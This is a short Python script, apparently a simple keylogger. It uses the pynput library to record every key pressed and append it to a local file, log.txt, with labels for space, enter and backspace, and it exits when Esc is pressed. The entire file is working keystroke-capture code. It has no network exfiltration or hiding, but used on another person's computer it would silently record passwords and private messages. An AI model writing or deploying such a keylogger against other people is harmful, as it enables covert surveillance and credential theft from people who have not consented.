import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    # number of Characters before appending to file
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:

            # removes single quotation marks from input
            k = str(key).replace("'","")

            # next line if Space Key is pressed
            if k.find("space") > 0:
                f.write('\n')

            # output if Enter Key is pressed
            if k.find("enter") > 0:
                f.write('\n[ent]')
            
            # output if Backspace Key is pressed
            if k.find("backspace") > 0:
                f.write('[bckspc]')

            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):

    # Exits the program if Esc Key is pressed
    if key == Key.esc:
        write_file("\n[Exited the Program]")
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()